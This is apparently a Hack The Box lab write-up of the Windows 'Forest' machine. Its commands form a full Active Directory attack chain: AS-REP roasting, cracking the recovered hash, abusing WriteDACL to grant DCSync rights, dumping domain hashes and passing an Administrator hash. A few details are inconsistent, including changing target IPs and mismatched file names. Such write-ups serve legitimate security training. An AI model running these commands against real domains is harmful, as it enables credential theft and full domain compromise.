---
title: "HTB: Forest"
date: 2023-09-06
draft: false
os: "Windows"
difficulty: "Easy"
platform: "HTB"
aliases: ["/posts/htb/forest/"]
tags:
  - htb
  - easy
  - windows
  - as-rep-roasting
  - bloodhound
  - dcsync
  - writedacl
  - active-directory
categories:
  - walkthrough
---

{{< box-info name="Forest" os="Windows" difficulty="Easy" ip="10.129.157.109" platform="HTB" >}}

---

## Recon

Standard AD box -- DNS, Kerberos, LDAP, SMB all present. Domain: `htb.local`.

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```
{{< /collapse >}}

**OS**: Windows Server 2016 Standard 14393 x64

### Port 445 - SMB

Null session enumeration with CrackMapExec reveals a list of domain users:

```bash
crackmapexec smb 10.129.157.109 -u '' -p '' --users --groups
```

Interesting accounts among the usual service/health mailbox noise:

- `sebastien`, `lucinda`, `andy`, `mark`, `santi`
- `svc-alfresco` -- service account, worth investigating

---

## Foothold

### AS-REP Roasting

The `svc-alfresco` account has Kerberos pre-authentication disabled, making it vulnerable to AS-REP roasting:

```bash
impacket-GetNPUsers htb.local/svc-alfresco -format john -outputfile hashes_asreproast \
  -dc-ip 10.129.157.109 -no-pass
```

Crack the hash with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt as_rep_hash.txt
```

```
s3rvice  ($krb5asrep$svc-alfresco@HTB.LOCAL)
```

Credentials: `svc-alfresco:s3rvice`. WinRM is open on port 5985, so Evil-WinRM gets us a shell.

---

## Privilege Escalation

### BloodHound Analysis

Run SharpHound to collect AD data:

```powershell
bloodhound-python -d htb.local -u svc-alfresco -p s3rvice \
  -gc forest.htb.local -c all -ns 10.129.135.139
```

BloodHound reveals the attack path:

1. `svc-alfresco` is a member of `Account Operators`
2. `Account Operators` has indirect path to Domain Admin through `Exchange Windows Permissions`
3. `Exchange Windows Permissions` has **WriteDACL** on the domain object

![BloodHound showing svc-alfresco membership in Account Operators](/images/forest/bloodhound.png)

![Attack path through Exchange Windows Permissions with WriteDACL](/images/forest/dcsync.png)

### WriteDACL to DCSync

The `WriteDACL` privilege lets us add ACLs to the domain object. The plan: create a user, add them to `Exchange Windows Permissions`, then grant DCSync rights.

Create a new domain user and add to the right groups:

```powershell
net user mumu Mumu1804 /add /domain
net localgroup "Remote Management Users" mumu /add
net groups "Exchange Windows Permissions" mumu /add
```

Upload PowerView and grant DCSync privileges:

```powershell
$pass = convertto-securestring 'Mumu1804' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('mumu', $pass)
Add-DomainObjectAcl -PrincipalIdentity "htb\mumu" -Credential $cred \
  -TargetIdentity "DC=htb, DC=local" -Rights DCSync
```

Dump the domain hashes:

```bash
crackmapexec smb 10.129.111.242 -u 'mumu' -p 'Mumu1804' --ntds
```

Pass-the-hash as Administrator:

```bash
impacket-psexec htb.local/administrator@10.129.111.242 \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'
```

---

## Proof

{{< terminal title="nt authority\system@FOREST" >}}
user.txt: [redacted]
root.txt: [redacted]
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- Always check for AS-REP roastable accounts -- service accounts often have pre-auth disabled
- BloodHound is essential for AD boxes; run SharpHound with credentials when you have them
- `WriteDACL` on the domain object is a direct path to DCSync and full domain compromise
- `Account Operators` membership is often overlooked but grants powerful group manipulation abilities
{{< /callout >}}
